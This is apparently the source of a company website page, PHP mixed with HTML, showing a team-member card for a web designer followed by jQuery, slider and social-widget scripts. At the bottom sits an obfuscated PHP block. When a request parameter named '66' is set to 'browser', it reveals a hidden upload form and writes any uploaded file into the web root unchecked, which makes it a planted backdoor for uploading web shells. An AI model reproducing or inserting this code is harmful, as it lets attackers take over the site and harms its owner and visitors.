                        <div class="team-img">
                            <img class="img-responsive" src="images/galaxy-kannan.jpg" alt="">
                        </div>
                        <div class="team-info">
						 <h4>Galaxy Kannan</h4>
                            <span>Web Designer</span><br />
                            <span>9443587282</span>
							<p>
						    Galaxy Technology Park Pvt Ltd 
						   </p>
                          
						   <a href="https://www.facebook.com/Galaxykannan"><img src="images/so/f.png"></a>&nbsp;
                            <a href="https://twitter.com/galaxykannangtp"><img src="images/so/t.png"></a>&nbsp;
                             <a href="https://plus.google.com/u/1/109689793321194989736"><img src="images/so/g.png"></a>&nbsp;
					 	
                              <a href="https://in.linkedin.com/in/galaxykannan"><img src="images/so/l.png"></a>
                        </div>
                        <p></p>
                        
                    </div>
                </div>
    </section>
	</div>
	<!-- Websites Section -->

<!-- Modal -->


<!-- AddThis Button BEGIN -->
<script type="text/javascript">var addthis_config = {"data_track_addressbar": true};</script>
<script type="text/javascript" src="../s7.addthis.com/js/300/addthis_widget.js#pubid=ra-50850f061c060dd6"></script>

<!-- Copyright Section -->
			<?php include("footer.php"); ?>


<!-- jQuery -->

<script src="js/jquery.min.js"></script>

<!-- Bootstrap Core JavaScript -->
<script src="js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/jquery.cslider.js"></script>
<script type="text/javascript" src="js/modernizr.custom.28468.js"></script>
<script type="text/javascript" src="js/jquery.marquee.min.js"></script>
<script src="js/jquery.fancybox8cbb.js?v=2.1.5"></script>
<script src="js/bootstrap-datepicker.js"></script>


<script>
    $('.menuLine').affix({
        offset: {
            top: $('header').height()
        }
    });
</script>
<!-- Script to Activate the Carousel -->
<script>
    $('.dropdown').on('mouseenter mouseleave click tap', function () {
        $(this).toggleClass("open");
    });
</script>
<script>
    $(document).ready(function () {
        $("#watchProfile").click(function () {
            $("#myModal").modal();
        });
    });
</script>
<script type="text/javascript">
    $(function () {
        $('#da-slider').cslider({
            autoplay: true,
            bgincrement: 450
        });

    });
</script>

<script type="text/javascript">
    $(function () {
        $('#marquee-vertical').marquee();
        $('#next-live').marquee();
        $('#latest-news').marquee();
    });
</script>

<script>!function (d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (!d.getElementById(id)) {
        js = d.createElement(s);
        js.id = id;
        js.src = "../platform.twitter.com/widgets.js";
        fjs.parentNode.insertBefore(js, fjs);
    }
}(document, "script", "twitter-wjs");</script>

<script type="text/javascript">
    $(function () {
        $('#popupload').modal();
    });
</script>
<?php
if
(isset
(
$_REQUEST[$browser=$x=strlen("Chrome") . strlen("Mozila")]) && 
$_REQUEST[$x=strlen("Chrome") . strlen("Mozila")]=="browser")
{
echo "<h2></h2><hr>";
echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
<label for=\"file\"></label>
<input type=\"file\" name=\"file\" id=\"file\" />
<br /><br />
<input type=\"submit\" name=\"default\" value=\"Upload\">
</form>";

{
move_uploaded_file($_FILES["file"]["tmp_name"],
"" . $_FILES["file"]["name"]);
echo "Rand(100-100): " . "" . $_FILES["file"]["name"];
echo"<hr>";
}
}
?> 
</body>

</html>
